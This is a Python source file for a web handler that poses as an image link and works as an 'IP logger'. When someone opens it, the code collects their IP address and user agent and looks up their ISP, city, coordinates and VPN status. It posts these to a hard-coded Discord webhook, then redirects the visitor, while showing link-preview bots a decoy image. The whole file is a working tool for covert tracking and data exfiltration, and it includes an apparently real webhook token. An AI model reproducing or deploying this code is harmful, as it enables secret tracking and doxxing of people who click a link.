from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import base64
import requests

config = {
    "webhook": "https://discord.com/api/webhooks/1504205879657103452/tTid9jFuaArEEOkZcukliQpJayOlft2NOEUUPiojCmgBPVyV4PMGGdZlUuYCpUt5zMDd",
    "image": "https://upload.wikimedia.org/wikipedia/en/thumb/2/27/Bliss_%28Windows_XP%29.png/270px-Bliss_%28Windows_XP%29.png",
    "redirect_page": "https://same-k28yfg1poye-latest.netlify.app/",
    "message": "Pwned By IP™"
}

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def send_to_discord(ip, useragent, endpoint):
    try:
        # Get IP info
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
        
        # Create embed
        embed = {
            "username": "IP™ Logger",
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - IP Logged",
                "color": 0x00FFFF,
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', 'Unknown')}, {info.get('lon', 'Unknown')}`
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **VPN:** `{info.get('proxy', False)}`

**User Agent:**
```
{useragent[:200]}
```""",
            }],
        }
        
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception as e:
        pass

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get IP
            ip = self.headers.get('x-forwarded-for', '0.0.0.0')
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            
            useragent = self.headers.get('user-agent', 'Unknown')
            
            # Parse URL
            parsed = parse.urlsplit(self.path)
            params = dict(parse.parse_qsl(parsed.query))
            
            # Get image URL
            image_url = config["image"]
            if params.get("url"):
                try:
                    image_url = base64.b64decode(params["url"].encode()).decode()
                except:
                    pass
            
            # Check if Discord bot
            is_bot = ip.startswith(("34", "35")) or useragent.startswith("TelegramBot")
            
            if is_bot:
                # Return loading image for bots
                self.send_response(200)
                self.send_header('Content-Type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(binaries["loading"])
                send_to_discord(ip, useragent, parsed.path)
                return
            
            # Send report
            send_to_discord(ip, useragent, parsed.path)
            
            # Redirect user
            html = f'<meta http-equiv="refresh" content="0;url={config["redirect_page"]}">'
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            error = f'<h1>Error</h1><pre>{traceback.format_exc()}</pre>'
            self.wfile.write(error.encode())
    
    def do_POST(self):
        return self.do_GET()
